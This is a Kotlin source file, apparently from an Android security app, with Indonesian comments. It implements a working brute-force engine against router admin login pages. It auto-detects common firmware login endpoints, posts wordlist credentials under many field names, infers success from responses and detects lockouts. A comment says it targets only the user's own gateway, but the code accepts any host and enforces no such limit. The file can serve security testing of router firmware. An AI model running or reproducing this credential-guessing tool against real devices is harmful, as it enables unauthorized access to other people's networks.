package com.mrksvt.firewallagent

import java.io.ByteArrayOutputStream
import java.net.HttpURLConnection
import java.net.URL
import java.net.URLEncoder
import java.util.concurrent.atomic.AtomicBoolean

/**
 * Brute force HTTP login router admin panel.
 * Mendukung:
 *  - endpoint auto-detect (coba path umum, deteksi form field password di HTML)
 *  - delay antar attempt (konfigurable — untuk uji anti-brute-force firmware)
 *  - lockout detection (N gagal beruntun dengan response identik / kode khusus)
 *  - ukur response time per attempt (firmware anti-brute mulai lambat setelah gagal)
 *
 * Aman: hanya berjalan saat user tekan START, target gateway milik user sendiri.
 */
object RouterBruteEngine {

    data class Attempt(
        val username: String,
        val password: String,
        val httpCode: Int,
        val responseTimeMs: Long,
        val success: Boolean,
        val lockedOut: Boolean,
    )

    data class BruteResult(
        val target: String,
        val endpoint: String,
        val totalAttempts: Int,
        val successAttempt: Attempt?,
        val lockoutAtAttempt: Int?,
        val avgResponseTimeMs: Long,
        val findings: List<String>,
    )

    // Path umum login router. Endpoint valid dipilih yang response-nya mengandung form password.
    private val DEFAULT_PATHS = listOf(
        "/", "/login", "/login.cgi", "/cgi-bin/luci", "/cgi-bin/luci/;stok=/login",
        "/cgi-bin/webproc", "/boaform/admin/formLogin", "/api/login", "/userRpm/LoginRpm.htm",
        "/goform/login", "/login.htm", "/index.htm",
    )

    private val PASSWORD_FIELD_RE = Regex("""name\s*=\s*["'](password|passwd|pwd|loginpass|userpass)["']""", RegexOption.IGNORE_CASE)
    private const val MAX_BODY_BYTES = 512 * 1024

    /**
     * Jalankan brute force terhadap [gateway] (IP, tanpa scheme).
     * [credentials] = daftar user:pass dari wordlist.
     * [onProgress] dipanggil per attempt (background thread — UI wajib post).
     * Mengembalikan [BruteResult]. [shouldStop] untuk batalkan dari thread lain.
     */
    fun bruteForce(
        gateway: String,
        credentials: List<WordlistParser.Credential>,
        delayMs: Long,
        onProgress: (attempt: Int, total: Int, cred: WordlistParser.Credential, result: Attempt) -> Unit,
        shouldStop: AtomicBoolean = AtomicBoolean(false),
    ): BruteResult {
        val findings = mutableListOf<String>()
        val base = normalizeBase(gateway)

        // 1. Auto-detect endpoint login.
        val endpoint = detectEndpoint(base) ?: run {
            findings.add("Endpoint login tidak terdeteksi di path umum; coba path pertama")
            "${base}/login"
        }
        if (endpoint != "${base}/login") {
            findings.add("Endpoint login terdeteksi: $endpoint")
        }

        val attempts = mutableListOf<Attempt>()
        var lockoutAt: Int? = null
        var lastFingerprint: String? = null
        var consecutiveLocked = 0

        val total = credentials.size
        for ((idx, cred) in credentials.withIndex()) {
            if (shouldStop.get()) {
                findings.add("Dihentikan user pada attempt ${idx + 1}")
                break
            }

            val attempt = tryLogin(endpoint, cred.username, cred.password, delayMs)

            // Lockout heuristic: response identik berturut + kode akses-ditolak.
            if (!attempt.success) {
                if (attempt.lockedOut) {
                    consecutiveLocked++
                    if (consecutiveLocked >= 3 && lockoutAt == null) {
                        lockoutAt = idx + 1
                        findings.add("LOCKOUT terdeteksi pada attempt ${idx + 1} (3x respons identik)")
                    }
                } else {
                    consecutiveLocked = 0
                }
                lastFingerprint = attempt.httpCode.toString()
            }

            attempts.add(attempt)
            onProgress(idx + 1, total, cred, attempt)

            if (attempt.success) {
                findings.add("SUKSES: user=${cred.username} pass=${cred.password} pada attempt ${idx + 1}")
                break
            }
            if (lockoutAt != null) break
        }

        val avgMs = if (attempts.isEmpty()) 0L else attempts.map { it.responseTimeMs }.average().toLong()
        return BruteResult(
            target = base,
            endpoint = endpoint,
            totalAttempts = attempts.size,
            successAttempt = attempts.firstOrNull { it.success },
            lockoutAtAttempt = lockoutAt,
            avgResponseTimeMs = avgMs,
            findings = findings,
        )
    }

    // ---------- internal ----------

    private fun normalizeBase(gateway: String): String {
        val trimmed = gateway.trim().trimEnd('/')
        return if (trimmed.startsWith("http://") || trimmed.startsWith("https://")) {
            trimmed
        } else {
            "http://$trimmed"
        }
    }

    private fun detectEndpoint(base: String): String? {
        for (path in DEFAULT_PATHS) {
            val url = "$base$path"
            try {
                val conn = openConnection(url)
                val code = conn.responseCode
                val body = readBody(conn, code)
                val isLoginPage = PASSWORD_FIELD_RE.containsMatchIn(body) ||
                    code in listOf(401, 403) ||
                    body.contains("password", ignoreCase = true)
                conn.disconnect()
                if (isLoginPage) return url
            } catch (_: Exception) {
                // path tidak ada / timeout — lanjut
            }
        }
        return null
    }

    private fun tryLogin(endpoint: String, username: String, password: String, delayMs: Long): Attempt {
        // delay SEBELUM request — anti-brute-force firmware diuji dengan delay yang bisa diset.
        if (delayMs > 0) {
            try { Thread.sleep(delayMs) } catch (_: InterruptedException) { Thread.currentThread().interrupt() }
        }

        val start = System.currentTimeMillis()
        return try {
            val conn = openConnection(endpoint)
            conn.requestMethod = "POST"
            conn.doOutput = true
            conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded")
            conn.setRequestProperty("User-Agent", "FirewallAgent-Pentest/1.0")
            conn.setRequestProperty("X-Requested-With", "XMLHttpRequest")

            val body = buildFormBody(username, password)
            conn.outputStream.use { it.write(body.toByteArray()) }

            val code = conn.responseCode
            val respBody = readBody(conn, code)
            val elapsed = System.currentTimeMillis() - start
            conn.disconnect()

            val success = isSuccess(code, respBody)
            // Lockout heuristic: 429/403 berulang atau body berisi kata lockout.
            val lockedOut = code == 429 ||
                respBody.contains("lock", ignoreCase = true) ||
                respBody.contains("blocked", ignoreCase = true) ||
                respBody.contains("too many", ignoreCase = true)

            Attempt(username, password, code, elapsed, success, lockedOut)
        } catch (e: Exception) {
            val elapsed = System.currentTimeMillis() - start
            Attempt(username, password, 0, elapsed, false, false)
        }
    }

    private fun buildFormBody(username: String, password: String): String {
        val fields = linkedMapOf(
            "username" to username,
            "user" to username,
            "login_name" to username,
            "password" to password,
            "pwd" to password,
            "passwd" to password,
        )
        return fields.entries.joinToString("&") { (k, v) ->
            "${URLEncoder.encode(k, "UTF-8")}=${URLEncoder.encode(v, "UTF-8")}"
        }
    }

    private fun isSuccess(code: Int, body: String): Boolean {
        if (code in 200..299 || code == 302) {
            // 302 = redirect pasca login (paling umum). 200 bisa jadi halaman login ulang.
            val failMarkers = listOf(
                "login error", "invalid", "incorrect", "wrong password",
                "authentication failed", "gagal", "salah", "denied", "unauthorized",
            )
            val hasFail = failMarkers.any { body.contains(it, ignoreCase = true) }
            return !hasFail && (code == 302 || code == 200 && body.length > 0)
        }
        return false
    }

    private fun openConnection(urlString: String): HttpURLConnection {
        val conn = URL(urlString).openConnection() as HttpURLConnection
        conn.connectTimeout = 5000
        conn.readTimeout = 8000
        conn.instanceFollowRedirects = false
        return conn
    }

    private fun readBody(conn: HttpURLConnection, code: Int): String {
        return try {
            val stream = if (code in 200..299) conn.inputStream else conn.errorStream
                ?: return ""
            val bos = ByteArrayOutputStream()
            val buf = ByteArray(4096)
            var total = 0
            while (total < MAX_BODY_BYTES) {
                val n = stream.read(buf)
                if (n < 0) break
                bos.write(buf, 0, n)
                total += n
            }
            stream.close()
            bos.toString("UTF-8")
        } catch (_: Exception) {
            ""
        }
    }
}
